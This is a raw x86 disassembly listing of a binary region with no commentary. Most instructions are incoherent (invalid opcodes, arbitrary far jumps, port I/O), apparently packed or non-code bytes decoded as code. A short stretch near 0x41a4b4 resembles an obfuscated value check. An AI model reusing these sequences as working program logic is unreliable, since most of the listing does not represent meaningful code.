  41a16f:	je     0x41a186
  41a171:	add    DWORD PTR [edx+0x7d588898],eax
  41a177:	mov    bl,0xd
  41a179:	inc    esi
  41a17a:	scas   eax,DWORD PTR es:[edi]
  41a17b:	sbb    bl,cl
  41a17d:	mov    edi,0x943de7ec
  41a182:	ja     0x41a1e4
  41a184:	mov    ebx,0xb572132a
  41a189:	cmp    BYTE PTR [edi-0x5672753e],bl
  41a18f:	or     edi,DWORD PTR [edx+0x56]
  41a192:	push   ds
  41a193:	mov    al,0x59
  41a195:	mov    ebp,DWORD PTR [esi+ecx*4]
  41a198:	cmp    esi,esi
  41a19a:	pop    ecx
  41a19b:	inc    edi
  41a19c:	bound  esp,QWORD PTR [ecx-0x21140061]
  41a1a2:	mov    DWORD PTR [ecx],esi
  41a1a4:	inc    DWORD PTR [ecx-0x50ec7b93]
  41a1aa:	pop    eax
  41a1ab:	mov    bl,0xdb
  41a1ad:	pushf  
  41a1ae:	jmp    0xa07e:0xd154c0ea
  41a1b5:	cwde   
  41a1b6:	push   esi
  41a1b7:	adc    DWORD PTR [ebx-0x4d],esp
  41a1ba:	pop    esp
  41a1bb:	cmp    DWORD PTR [ebp-0x5781e667],esi
  41a1c1:	outs   dx,DWORD PTR ds:[esi]
  41a1c2:	je     0x41a23e
  41a1c4:	cld    
  41a1c5:	jb     0x41a226
  41a1c7:	sbb    al,0xf9
  41a1c9:	fdivr  DWORD PTR [edi]
  41a1cb:	adc    dh,BYTE PTR [ecx+0x38f99e3a]
  41a1d1:	into   
  41a1d2:	inc    edi
  41a1d3:	xchg   ebx,eax
  41a1d4:	(bad)  
  41a1d5:	and    BYTE PTR [edx-0x64],al
  41a1d8:	bound  ecx,QWORD PTR [ebx]
  41a1da:	and    al,0x7e
  41a1dc:	pop    es
  41a1dd:	pop    esi
  41a1de:	mov    dh,0x3b
  41a1e0:	mov    bh,BYTE PTR [eax]
  41a1e2:	clc    
  41a1e3:	div    BYTE PTR [edx]
  41a1e5:	arpl   WORD PTR [ecx],si
  41a1e7:	shl    BYTE PTR [ecx-0x51],0xe5
  41a1eb:	push   eax
  41a1ec:	sub    DWORD PTR [edx],edx
  41a1ee:	mov    ds:0x21ddd78c,al
  41a1f3:	in     al,0xb2
  41a1f5:	inc    edx
  41a1f6:	ja     0x41a232
  41a1f8:	jo     0x41a1c9
  41a1fa:	push   cs
  41a1fb:	jne    0x41a22c
  41a1fd:	outs   dx,BYTE PTR ds:[esi]
  41a1fe:	ins    BYTE PTR es:[edi],dx
  41a1ff:	test   eax,0xa6f1d67b
  41a204:	mov    WORD PTR [esi-0x7246c606],fs
  41a20a:	addr16 xchg ebp,eax
  41a20c:	fmul   QWORD PTR [edi+edi*1+0x17]
  41a210:	test   al,0x5d
  41a212:	push   ss
  41a213:	sti    
  41a214:	int    0x96
  41a216:	(bad)  
  41a217:	push   0xffffff92
  41a219:	jae    0x41a1e7
  41a21b:	stos   DWORD PTR es:[edi],eax
  41a21c:	outs   dx,BYTE PTR ds:[esi]
  41a21d:	add    edi,edx
  41a21f:	add    DWORD PTR [edi-0x6],0x87c1231c
  41a226:	sub    BYTE PTR [edx],ah
  41a228:	adc    al,0xeb
  41a22a:	mov    ecx,0x4b55bbdb
  41a22f:	scas   al,BYTE PTR es:[edi]
  41a230:	jl     0x41a27a
  41a232:	aas    
  41a233:	out    dx,al
  41a234:	push   eax
  41a235:	and    esi,DWORD PTR [ebp+esi*1+0x7f068f11]
  41a23c:	cmp    eax,0xbf41c345
  41a241:	jo     0x41a2a8
  41a243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a244:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a245:	pop    ecx
  41a246:	call   0x3bdb:0x16d5cd2c
  41a24d:	mov    edi,0x9b30c5fa
  41a252:	je     0x41a2a8
  41a254:	pop    edx
  41a255:	loope  0x41a1e0
  41a257:	loop   0x41a247
  41a259:	xlat   BYTE PTR ds:[ebx]
  41a25a:	jbe    0x41a28a
  41a25c:	out    0x50,eax
  41a25e:	jne    0x41a2ba
  41a260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a261:	outs   dx,DWORD PTR ds:[esi]
  41a262:	mov    bh,0x13
  41a264:	jl     0x41a1f7
  41a266:	fist   WORD PTR [eax]
  41a268:	xchg   esp,eax
  41a269:	jge    0x41a22f
  41a26b:	pop    eax
  41a26c:	sbb    ebp,esi
  41a26e:	push   es
  41a26f:	mov    BYTE PTR [eax],ch
  41a271:	xchg   edx,eax
  41a272:	sbb    eax,0x43ce1be0
  41a277:	inc    edx
  41a278:	jno    0x41a2bd
  41a27a:	mov    ecx,DWORD PTR [eax]
  41a27c:	inc    ecx
  41a27d:	mov    edi,0x3361aaad
  41a282:	icebp  
  41a283:	xchg   esp,eax
  41a284:	lds    ebp,FWORD PTR [edx+0x9186d22]
  41a28a:	xchg   edi,eax
  41a28b:	sub    DWORD PTR [ecx],ecx
  41a28d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a28e:	adc    al,0x6c
  41a290:	aad    0x60
  41a292:	add    eax,0x52425561
  41a297:	xchg   esi,eax
  41a298:	mov    esi,0xcc81089d
  41a29d:	(bad)  
  41a29f:	cdq    
  41a2a0:	push   edx
  41a2a1:	mov    ds:0x8a6afe2c,al
  41a2a6:	bound  edx,QWORD PTR [eax]
  41a2a8:	cmp    DWORD PTR [eax],eax
  41a2aa:	(bad)  
  41a2ab:	cmc    
  41a2ac:	pop    ds
  41a2ad:	sbb    DWORD PTR [edx+0x6581008f],edi
  41a2b3:	test   BYTE PTR [ecx+0x7e],0x19
  41a2b7:	push   ss
  41a2b8:	xchg   edi,esi
  41a2ba:	rcr    esi,1
  41a2bc:	xor    cl,BYTE PTR [ecx]
  41a2be:	mov    es,WORD PTR [ebx-0x4ff095fe]
  41a2c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2c5:	std    
  41a2c6:	sbb    esi,DWORD PTR [esi]
  41a2c8:	add    BYTE PTR [ebp-0x61],cl
  41a2cb:	cmp    al,0x38
  41a2cd:	lahf   
  41a2ce:	cmp    DWORD PTR [edi],0xefcb3dec
  41a2d4:	and    eax,0xdb802ba
  41a2d9:	cmp    cl,BYTE PTR [eax-0x20]
  41a2dc:	cwde   
  41a2dd:	mov    esi,0x464144c9
  41a2e2:	cmp    DWORD PTR [edx+ebp*1-0x28],esp
  41a2e6:	mov    ds:0x478a8b9c,eax
  41a2eb:	push   esi
  41a2ec:	int3   
  41a2ed:	clc    
  41a2ee:	out    dx,eax
  41a2ef:	pop    bx
  41a2f1:	(bad)
  41a2f4:	cmp    ebx,DWORD PTR [edx-0x58b9d04b]
  41a2fa:	jecxz  0x41a2dc
  41a2fc:	mov    bh,0xdf
  41a2fe:	test   DWORD PTR [eax],eax
  41a300:	jmp    0x1117:0xfbb8388d
  41a307:	sahf   
  41a308:	jmp    0x5909ccee
  41a30d:	je     0x41a32b
  41a30f:	test   eax,0x4a9e3be3
  41a314:	jmp    0xc2cc:0x55f4a2da
  41a31b:	jno    0x41a370
  41a31d:	mov    bl,0xeb
  41a31f:	xor    ebp,DWORD PTR [esi-0x63571002]
  41a325:	pop    ds
  41a326:	jo     0x41a2b7
  41a328:	nop
  41a329:	xchg   edi,eax
  41a32a:	test   al,0x1c
  41a32c:	retf   0x13da
  41a32f:	fisub  DWORD PTR [eax+0x2231162b]
  41a335:	mov    bl,0x40
  41a337:	rcl    ecx,0x64
  41a33a:	inc    BYTE PTR [esi]
  41a33c:	push   eax
  41a33d:	loopne 0x41a3ad
  41a33f:	pop    esp
  41a340:	pusha  
  41a341:	adc    bh,cl
  41a343:	mov    esp,0xb061bdf1
  41a348:	sbb    eax,DWORD PTR [ebp+0xfb14a53]
  41a34e:	or     eax,0xfa8065b3
  41a353:	imul   BYTE PTR [edi+0x2e45c4a1]
  41a359:	pop    es
  41a35a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a35b:	stos   BYTE PTR es:[edi],al
  41a35c:	jp     0x41a303
  41a35e:	out    dx,eax
  41a35f:	xchg   ecx,eax
  41a360:	div    esi
  41a362:	sbb    DWORD PTR [ebx+0xc],ebx
  41a365:	add    ebp,DWORD PTR [edx]
  41a367:	retf   0xdcb2
  41a36a:	inc    ebp
  41a36b:	pop    esp
  41a36c:	push   ebx
  41a36d:	in     al,0xaa
  41a36f:	cli    
  41a370:	add    DWORD PTR ds:0x905d9168,esi
  41a376:	(bad)  
  41a377:	xchg   ecx,eax
  41a378:	sbb    al,0x4a
  41a37a:	popa   
  41a37b:	loop   0x41a330
  41a37d:	das    
  41a37e:	pop    eax
  41a37f:	enter  0x8018,0x56
  41a383:	jns    0x41a3ca
  41a385:	push   es
  41a386:	push   ecx
  41a387:	shr    DWORD PTR [edx*2-0x452b34f0],1
  41a38e:	call   0x6104:0x12ad423
  41a395:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a396:	(bad)  
  41a397:	rcr    BYTE PTR [edi],0x9d
  41a39a:	out    dx,eax
  41a39b:	or     edi,DWORD PTR [ebx+0x4a]
  41a39e:	mov    esi,edi
  41a3a0:	cmp    BYTE PTR [edi],dl
  41a3a2:	fmulp  st(4),st
  41a3a4:	or     ah,BYTE PTR [edx+0x51]
  41a3a7:	sub    ah,dl
  41a3a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3aa:	xor    DWORD PTR [ebx+0x18],esi
  41a3ad:	cmp    cl,BYTE PTR [ebp-0x2e20caf3]
  41a3b3:	inc    esp
  41a3b4:	push   ebx
  41a3b5:	mov    ebx,0x81db0ed
  41a3ba:	or     esi,esi
  41a3bc:	scas   eax,DWORD PTR es:[edi]
  41a3bd:	data16 jo 0x41a38c
  41a3c0:	mov    edi,DWORD PTR [edi]
  41a3c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3c3:	icebp  
  41a3c4:	xlat   BYTE PTR ds:[ebx]
  41a3c5:	sub    al,0x32
  41a3c7:	pop    esi
  41a3c8:	push   edi
  41a3c9:	xor    BYTE PTR ds:0xea202b20,dl
  41a3cf:	xor    DWORD PTR [ebx+0x49],edi
  41a3d2:	pop    ebp
  41a3d3:	xchg   edi,eax
  41a3d4:	outs   dx,BYTE PTR ds:[esi]
  41a3d5:	jp     0x41a453
  41a3d7:	xor    BYTE PTR [ecx+0x5a],cl
  41a3da:	bound  edx,QWORD PTR [esi]
  41a3dc:	mov    ah,0x5
  41a3de:	mov    edx,ds
  41a3e0:	adc    BYTE PTR [ebp+0x423d296b],ah
  41a3e6:	inc    edi
  41a3e7:	(bad)  
  41a3e8:	adc    bl,BYTE PTR [eax-0x711c72b9]
  41a3ee:	test   eax,0xf6d75613
  41a3f3:	es and edx,ebp
  41a3f6:	sub    eax,0x4f0179e7
  41a3fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3fc:	out    dx,eax
  41a3fd:	mov    esi,0x2fdc6b73
  41a402:	mov    WORD PTR [eax+0x74],gs
  41a405:	out    0xee,al
  41a407:	or     bl,BYTE PTR [ecx+esi*4+0x41890300]
  41a40e:	adc    esi,DWORD PTR [ebx]
  41a410:	jmp    0xef06:0xde941608
  41a417:	dec    esi
  41a418:	fimul  WORD PTR [ecx]
  41a41a:	ficomp WORD PTR [edi]
  41a41c:	(bad)  
  41a41d:	and    eax,0xc9bb4e1f
  41a422:	mov    ah,0x6
  41a424:	rol    DWORD PTR [ebx-0x7e5b129d],0x8a
  41a42b:	push   ds
  41a42c:	(bad)  
  41a42d:	mov    edx,0x505791cf
  41a432:	add    eax,esp
  41a434:	sub    eax,0x73b6837
  41a439:	ins    BYTE PTR es:[edi],dx
  41a43a:	or     dl,ah
  41a43c:	sbb    DWORD PTR [esi+eax*8-0x75f2a4b3],eax
  41a443:	sbb    BYTE PTR [ecx-0x7ce05a6c],bl
  41a449:	imul   DWORD PTR [esi]
  41a44b:	out    0x38,eax
  41a44d:	mov    edi,0x231238d2
  41a452:	cmc    
  41a453:	(bad)  [esi+0x21f70d4b]
  41a459:	les    edx,FWORD PTR [eax-0x379d0ab8]
  41a45f:	xchg   ebx,eax
  41a460:	push   esp
  41a461:	mov    ds:0xff090730,al
  41a466:	pop    ecx
  41a467:	xchg   eax,ebx
  41a469:	dec    eax
  41a46a:	call   0x4b0c:0xdd77a059
  41a471:	in     eax,dx
  41a472:	add    DWORD PTR [ecx+0xd192580],ebx
  41a478:	data16 mov al,ds:0x9f5fdd3
  41a47e:	mov    ah,0xd9
  41a480:	loop   0x41a490
  41a482:	mov    ah,BYTE PTR ds:0xe1da8ec9
  41a488:	pop    ecx
  41a489:	mov    eax,0xc3e71609
  41a48e:	outs   dx,DWORD PTR ds:[esi]
  41a48f:	int3   
  41a490:	sub    eax,DWORD PTR [esi]
  41a492:	push   ecx
  41a493:	shl    DWORD PTR [esp+ebx*2-0xfb6db8f],1
  41a49a:	call   FWORD PTR [ecx-0xbe30a71]
  41a4a0:	sbb    cl,BYTE PTR [ebx-0x3c4cd0a3]
  41a4a6:	jns    0x41a504
  41a4a8:	mov    ah,0x2
  41a4aa:	call   0xbf5d:0xfe836bc3
  41a4b1:	ins    BYTE PTR es:[edi],dx
  41a4b2:	jmp    0x41a472
  41a4b4:	xor    esi,edx
  41a4b6:	add    eax,ecx
  41a4b8:	add    esi,ecx
  41a4ba:	imul   eax,esi
  41a4bd:	jmp    0x41c8af
  41a4c2:	mov    eax,DWORD PTR [ebp+0xc]
  41a4c5:	mov    eax,DWORD PTR [eax+0x78]
  41a4c8:	mov    DWORD PTR [ebp+0xc],eax
  41a4cb:	mov    eax,DWORD PTR [ebp-0x4]
  41a4ce:	mov    esi,DWORD PTR [ebp-0x8]
  41a4d1:	xor    eax,edx
  41a4d3:	xor    esi,edx
  41a4d5:	add    eax,ecx
  41a4d7:	add    esi,ecx
  41a4d9:	imul   eax,esi
  41a4dc:	mov    esi,DWORD PTR [ebp+0xc]
  41a4df:	cmp    esi,eax
  41a4e1:	mov    eax,DWORD PTR [ebp-0x4]
  41a4e4:	je     0x4180fd
  41a4ea:	xor    eax,edx
  41a4ec:	jmp    0x41c89e
  41a4f1:	aaa    
  41a4f2:	dec    eax
  41a4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4f4:	sbb    DWORD PTR [edi-0x67],esp
  41a4f7:	xchg   DWORD PTR [eax],ebp
  41a4f9:	and    bl,BYTE PTR [ecx+eiz*8+0x296426ab]
  41a500:	ds dec eax
  41a502:	add    BYTE PTR [ecx+0x62],ah
  41a505:	int    0x5f
  41a507:	bound  esp,QWORD PTR [edx+0x70]
  41a50a:	aas    
  41a50b:	sub    al,0x35
  41a50d:	xchg   edx,eax
  41a50e:	test   DWORD PTR [ebp+0x36cc0267],eax
  41a514:	into   
  41a515:	xchg   ecx,eax
  41a516:	pop    edi
  41a517:	or     DWORD PTR [ebx],esi
  41a519:	jp     0x41a515
  41a51b:	inc    esp
  41a51c:	stos   BYTE PTR es:[edi],al
  41a51d:	ja     0x41a510
  41a51f:	mov    esi,esp
  41a521:	jecxz  0x41a566
  41a523:	mov    ch,BYTE PTR [ebp+0x4e15fe86]
  41a529:	in     eax,0x70
  41a52b:	add    eax,0xa1e1633f
  41a530:	test   al,0x96
  41a532:	lea    eax,[ecx+0x331cf725]
  41a538:	and    eax,DWORD PTR [ebx]
  41a53a:	les    edx,FWORD PTR [eax+0x7597c1e0]
  41a540:	pop    ebp
  41a541:	push   edi
  41a542:	aaa    
  41a543:	loope  0x41a5bc
  41a545:	jno    0x41a548
  41a547:	loope  0x41a5b8
  41a549:	fnsave [esi]
  41a54b:	dec    ebp
  41a54c:	dec    ebx
  41a54d:	or     ch,BYTE PTR [ecx]
  41a54f:	sar    DWORD PTR [ebx+eax*4+0x16255ce1],cl
  41a556:	dec    edi
  41a557:	pushf  
  41a558:	xchg   ecx,eax
  41a559:	in     al,0xee
  41a55b:	outs   dx,BYTE PTR ds:[esi]
  41a55c:	xchg   BYTE PTR [edi-0x7f],bh
  41a55f:	call   0xe3b231a6
  41a564:	adc    esi,DWORD PTR [edi-0x5d]
  41a567:	and    esp,DWORD PTR [ecx]
  41a569:	and    edx,DWORD PTR ds:0x21cff5a2
  41a56f:	jne    0x41a539
  41a571:	sbb    DWORD PTR [ecx-0x7b],esp
  41a574:	mov    es,WORD PTR [ebx]
  41a576:	add    BYTE PTR [ebp+0x3d],dh
  41a579:	(bad)  
  41a57a:	xchg   edi,eax
  41a57b:	cli    
  41a57c:	add    eax,0xa2aeb7e5
  41a581:	mov    WORD PTR [ebx-0x5d6d527b],?
  41a587:	adc    cl,BYTE PTR [eax]
  41a589:	fdivr  QWORD PTR [edx+esi*4+0x1f]
  41a58d:	push   ebp
  41a58e:	lds    edx,FWORD PTR ds:0x5809978c
  41a594:	dec    ebp
  41a595:	pop    ecx
  41a596:	push   edi
  41a597:	add    al,0x4f
  41a599:	xchg   ebp,eax
  41a59a:	adc    ebx,DWORD PTR [edx]
  41a59c:	mov    WORD PTR [ebx+0x78],cs
  41a59f:	pop    ecx
  41a5a0:	xchg   edx,eax
  41a5a1:	fisub  WORD PTR [edi-0x2250414f]
  41a5a7:	jb     0x41a54e
  41a5a9:	cmp    eax,0x399903f0
  41a5ae:	sbb    ebp,esp
  41a5b0:	jnp    0x41a5ef
  41a5b2:	sbb    eax,0x2351527c
  41a5b7:	xor    ecx,DWORD PTR ds:0x351a9ac2
  41a5bd:	mov    bh,0x57
  41a5bf:	xchg   ebx,eax
  41a5c0:	xchg   DWORD PTR [ecx-0x35c02a6f],edi
  41a5c6:	mov    dh,0x3f
  41a5c8:	in     eax,dx
  41a5c9:	sub    bl,BYTE PTR [edi-0x19]
  41a5cc:	or     ebp,DWORD PTR [eax-0x1c]
  41a5cf:	sar    BYTE PTR [ecx],1
  41a5d1:	xor    DWORD PTR [edi+0x1c],edx
  41a5d4:	fild   DWORD PTR [edx-0x2b]
  41a5d7:	push   0xffffffb5
  41a5d9:	dec    esi
  41a5da:	les    ecx,FWORD PTR [ebx+0x6f]
  41a5dd:	retf   0xbbc7
  41a5e0:	arpl   WORD PTR [eax],cx
  41a5e2:	je     0x41a645
  41a5e4:	mov    bh,0x14
  41a5e6:	ins    BYTE PTR es:[edi],dx
  41a5e7:	cli    
  41a5e8:	adc    al,0x46
  41a5ea:	xor    eax,0x56147fa2
  41a5ef:	mov    dl,0xc8
  41a5f1:	inc    esi
  41a5f2:	dec    ecx
  41a5f3:	or     BYTE PTR [ebp+ebx*4-0x69ddc083],bh
  41a5fa:	inc    ecx
  41a5fb:	mov    dl,0x11
  41a5fd:	(bad)  
  41a5fe:	mov    esp,0x8efc2ac0
  41a603:	dec    eax
  41a604:	out    dx,eax
  41a605:	xchg   esp,eax
  41a606:	adc    cl,BYTE PTR [ebp-0x4fd2f5ca]
  41a60c:	jae    0x41a675
  41a60e:	mov    ch,0xff
  41a610:	jp     0x41a5ed
  41a612:	pop    esi
  41a613:	repz mov esp,DWORD PTR [esi-0x4b5f1e3a]
  41a61a:	jl     0x41a5dd
  41a61c:	inc    ecx
  41a61d:	push   ebp
  41a61e:	cs mov ah,0xb7
  41a621:	(bad)  
  41a623:	xor    al,0xf
  41a625:	scas   eax,DWORD PTR es:[edi]
  41a626:	inc    ebp
  41a627:	mul    al
  41a629:	dec    esi
  41a62a:	popf   
  41a62b:	sahf   
  41a62c:	ja     0x41a60a
  41a62e:	ret    
  41a62f:	push   esp
  41a630:	iret   
  41a631:	fistp  DWORD PTR [ebx]
  41a633:	and    BYTE PTR [ecx],ah
  41a635:	out    0xd3,eax
  41a637:	fnstsw WORD PTR [ebx-0x7b]
  41a63a:	cwde   
  41a63b:	sbb    dl,BYTE PTR [edx-0x4d6cf691]
  41a641:	fidivr DWORD PTR [eax+0x6cc43c21]
  41a647:	xchg   edx,eax
  41a648:	stc    
  41a649:	div    ecx
  41a64b:	cmp    al,0x25
  41a64d:	jbe    0x41a68d
  41a64f:	adc    eax,DWORD PTR [ecx]
  41a651:	mov    ecx,0x799e8851
  41a656:	cld    
  41a657:	xor    BYTE PTR [edx+0x46],dl
  41a65a:	push   0xffffffd6
  41a65c:	test   eax,0x5af089e6
  41a661:	or     al,0xb5
  41a663:	mov    ebp,DWORD PTR [edi]
  41a665:	mov    bl,0x56
  41a667:	adc    ebp,eax
  41a669:	sbb    eax,0xc805ebdb
  41a66e:	sub    esp,DWORD PTR [ebx-0x167138b9]
  41a674:	add    edi,DWORD PTR [ecx+ecx*2]
  41a677:	mov    ebp,0x1a0312ab
  41a67c:	pop    ebx
  41a67d:	sbb    DWORD PTR ds:0x1208e1d0,ebx
  41a683:	pop    ebp
  41a684:	mov    esi,cr2
  41a687:	push   esp
  41a688:	leave  
  41a689:	(bad)
  41a68e:	clc    
  41a68f:	mov    edx,DWORD PTR [esi]
  41a691:	mov    ch,0xe7
  41a693:	push   0x12d0cd56
  41a698:	mov    ch,0x45
  41a69a:	das    
  41a69b:	in     eax,0x2
  41a69d:	push   edi
  41a69e:	and    BYTE PTR ds:0x42718d08,0x55
  41a6a5:	xor    eax,0x6223da17
  41a6aa:	fcom   st(4)
  41a6ac:	mov    ch,0xd5
  41a6ae:	pusha  
  41a6af:	mov    esi,0xeb360db5
  41a6b4:	(bad)  
  41a6b5:	es enter 0x76fe,0x4
  41a6ba:	mov    cl,0xaf
  41a6bc:	mov    al,0xa6
  41a6be:	add    eax,0xac5ca592
  41a6c3:	(bad)
  41a6c6:	adc    al,0x49
  41a6c8:	test   BYTE PTR [eax-0x3c],ah
  41a6cb:	sub    bl,dl
  41a6cd:	add    al,0x70
  41a6cf:	loop   0x41a6dc
  41a6d1:	adc    ax,0x7b86
  41a6d5:	je     0x41a66c
  41a6d7:	jmp    0x41a6f5
  41a6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6da:	das    
  41a6db:	or     ebx,edi
  41a6dd:	cmp    al,BYTE PTR [ebp+0x24b4b05f]
  41a6e3:	push   edx
  41a6e4:	jne    0x41a743
  41a6e6:	imul   ecx,esp,0xffffffe0
  41a6e9:	dec    ecx
  41a6ea:	cmp    dh,dh
  41a6ec:	jge    0x41a696
  41a6ee:	cmc    
  41a6ef:	add    ecx,DWORD PTR [edi+0x40]
  41a6f2:	sahf   
  41a6f3:	xlat   BYTE PTR ds:[ebx]
  41a6f4:	mov    bh,0xf2
  41a6f6:	cdq    
  41a6f7:	(bad)  
  41a6f8:	jg     0x41a6ac
  41a6fa:	in     al,dx
  41a6fb:	out    dx,eax
  41a6fc:	imul   ebp,DWORD PTR [esi-0x335ec601],0xbe4a9bc0
  41a706:	fwait
  41a707:	xor    DWORD PTR [eax-0x4660411],ecx
  41a70d:	sti    
  41a70e:	jmp    0xb8d3:0x2cd6e577
  41a715:	or     DWORD PTR [esi+0x5394b0dc],0xffffffaf
  41a71c:	pop    ss
  41a71d:	push   ds
  41a71e:	adc    BYTE PTR [edx+0x78d990d2],ah
  41a724:	test   al,0xa7
  41a726:	out    dx,eax
  41a727:	dec    ebp
  41a728:	outs   dx,DWORD PTR ds:[esi]
  41a729:	jle    0x41a710
  41a72b:	inc    ebp
  41a72c:	icebp  
  41a72d:	dec    ecx
  41a72e:	and    eax,0x3c99c395
  41a733:	inc    esi
  41a734:	arpl   WORD PTR [eax+0x3328203a],ax
  41a73a:	xchg   ebp,eax
  41a73b:	inc    edx
  41a73c:	sbb    BYTE PTR [eax+0x5613c472],cl
  41a742:	fldlg2 
  41a744:	inc    ebp
  41a745:	dec    ecx
  41a746:	xor    BYTE PTR [esi+0x54c25da6],bl
  41a74c:	div    BYTE PTR [ebx]
  41a74e:	int3   
  41a74f:	das    
  41a750:	cli    
  41a751:	pop    eax
  41a752:	or     BYTE PTR [ebx+0x404f010e],ah
  41a758:	not    BYTE PTR [ebp-0x5a]
  41a75b:	inc    esi
  41a75c:	(bad)  
  41a75d:	jle    0x41a6fe
  41a75f:	iret   
  41a760:	add    DWORD PTR [ebp+edi*8-0x4a40208],eax
  41a767:	inc    ecx
  41a768:	js     0x41a7d9
  41a76a:	mov    ebx,0xf532b95d
  41a76f:	and    DWORD PTR [eax],ebx
  41a771:	loope  0x41a74f
  41a773:	outs   dx,BYTE PTR ds:[esi]
  41a774:	iret   
  41a775:	sub    BYTE PTR [ebp-0x73],cl
  41a778:	jno    0x41a7c6
  41a77a:	inc    esi
  41a77b:	push   ss
  41a77c:	sbb    DWORD PTR [edi],eax
  41a77e:	stos   DWORD PTR es:[edi],eax
  41a77f:	or     eax,0x994a9d44
  41a784:	mov    BYTE PTR [ebp-0x77],bh
  41a787:	push   es
  41a788:	nop
  41a789:	sub    DWORD PTR [ecx-0x7dc532a5],0xd7717851
  41a793:	push   edx
  41a794:	js     0x41a7b7
  41a796:	pop    edi
  41a797:	jo     0x41a779
  41a799:	and    bh,BYTE PTR [edx+0x40]
  41a79c:	adc    BYTE PTR [eax],bl
  41a79e:	xor    BYTE PTR ds:0xeb7e99f1,dh
  41a7a4:	sub    esp,esp
  41a7a6:	data16 clc 
  41a7a8:	mov    bh,0x91
  41a7aa:	ds nop
  41a7ac:	jno    0x41a822
  41a7ae:	and    DWORD PTR [ebp+ebp*4-0x54],0x5b
  41a7b3:	cld    
  41a7b4:	pop    es
  41a7b5:	pop    es
  41a7b6:	mov    es,WORD PTR ss:[ebx-0x472faebd]
  41a7bd:	icebp  
  41a7be:	jecxz  0x41a7c8
  41a7c0:	nop
  41a7c1:	inc    ecx
  41a7c2:	xchg   esi,eax
  41a7c3:	pop    ebx
  41a7c4:	stos   BYTE PTR es:[edi],al
  41a7c5:	fist   DWORD PTR [eax-0xd]
  41a7c8:	and    esi,DWORD PTR [ecx-0x2f]
  41a7cb:	loop   0x41a7a3
  41a7cd:	repz jle 0x41a806
  41a7d0:	jmp    DWORD PTR [edi]
  41a7d2:	mov    bh,0x4a
  41a7d4:	sti    
  41a7d5:	(bad)  
  41a7d6:	push   ds
  41a7d7:	and    eax,0x7177ca1
  41a7dc:	inc    esp
  41a7dd:	shl    DWORD PTR [ebp-0x5],cl
  41a7e0:	retf   0x5362
  41a7e3:	pop    ss
  41a7e4:	call   0x4f95:0xa9554ded
  41a7eb:	xchg   ebp,eax
  41a7ec:	mov    ecx,0xf7ad1d8f
  41a7f1:	dec    ebx
  41a7f2:	mov    esp,0xf7edec66
  41a7f7:	jbe    0x41a7db
  41a7f9:	inc    esi
  41a7fa:	pop    ebp
  41a7fb:	xor    ebx,DWORD PTR [eax-0x5578163]
  41a801:	mov    DWORD PTR ds:0x3562eecd,esp
  41a807:	push   esi
  41a808:	mov    al,ds:0x4cc136b3
  41a80d:	add    ah,ah
  41a80f:	cmp    al,0xde
  41a811:	adc    edx,esp
  41a813:	jl     0x41a848
  41a815:	inc    esi
  41a816:	mov    dl,al
  41a818:	sub    al,0x67
  41a81a:	loope  0x41a7de
  41a81c:	jmp    0xbf5b:0x283b984
  41a823:	fist   WORD PTR [ecx-0x56d1a7c2]
  41a829:	sbb    al,BYTE PTR [edx+0x73ffc2d1]
  41a82f:	mov    ch,0x50
  41a831:	lods   eax,DWORD PTR ds:[esi]
  41a832:	out    0xd0,al
  41a834:	inc    edx
  41a835:	and    edx,DWORD PTR [eax+ecx*4+0x373b4e97]
  41a83c:	outs   dx,BYTE PTR ds:[esi]
  41a83d:	and    BYTE PTR [ecx+ebx*1+0x5],dl
  41a841:	or     bh,BYTE PTR [edx+0x2803ecdf]
  41a847:	arpl   WORD PTR [edi+0x16],ax
  41a84a:	cmc    
  41a84b:	add    dh,bl
  41a84d:	mov    esi,0x174273a0
  41a852:	in     al,0xaa
  41a854:	int    0xe
  41a856:	mov    esi,0xc1b99615
  41a85b:	and    ebp,esi
  41a85d:	add    BYTE PTR [esi+ebx*2+0x61],dl
  41a861:	sub    ebx,DWORD PTR [ebx-0x42212469]
  41a867:	xchg   edi,eax
  41a868:	sub    eax,0x3b15359a
  41a86d:	xor    dl,ah
  41a86f:	mov    bl,0xba
  41a871:	dec    ebx
  41a872:	mov    gs,WORD PTR [ebp+ebx*2+0x7495e702]
  41a879:	jmp    0x31da:0x67b1f4e2
  41a880:	mov    esp,0x55fd1b80
  41a885:	sbb    al,0xe8
  41a887:	xchg   ecx,eax
  41a888:	lods   al,BYTE PTR ds:[esi]
  41a889:	mov    ebx,0x46014c6c
  41a88e:	sar    BYTE PTR [esi+0x51],1
  41a891:	push   ebp
  41a892:	jae    0x41a81a
  41a894:	test   bl,dl
  41a896:	rcl    DWORD PTR [ecx],1
  41a898:	ja     0x41a8a3
  41a89a:	popf   
  41a89b:	data16 jmp 0x41a83d
  41a89e:	inc    edx
  41a89f:	push   edx
  41a8a0:	dec    esp
  41a8a1:	dec    eax
  41a8a2:	cmp    BYTE PTR [esi],cl
  41a8a4:	add    ax,0xb30a
  41a8a8:	sub    BYTE PTR [eax+0x1f3b0a97],cl
  41a8ae:	cmp    al,0xdd
  41a8b0:	or     al,0xaf
  41a8b2:	popf   
  41a8b3:	adc    ebx,DWORD PTR [esi+0x60]
  41a8b6:	adc    al,0x85
  41a8b8:	(bad)  
  41a8ba:	sub    BYTE PTR [esi+ebp*1],al
  41a8bd:	pop    ebp
  41a8be:	loop   0x41a93a
  41a8c0:	outs   dx,DWORD PTR ds:[esi]
  41a8c1:	repz jg 0x41a87c
  41a8c4:	xor    eax,0xc2f76135
  41a8c9:	xchg   al,cl
  41a8cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8cc:	pushf  
  41a8cd:	in     eax,0xf7
  41a8cf:	inc    esi
  41a8d0:	adc    eax,0x7478afa7
  41a8d5:	pop    esi
  41a8d6:	xchg   esp,eax
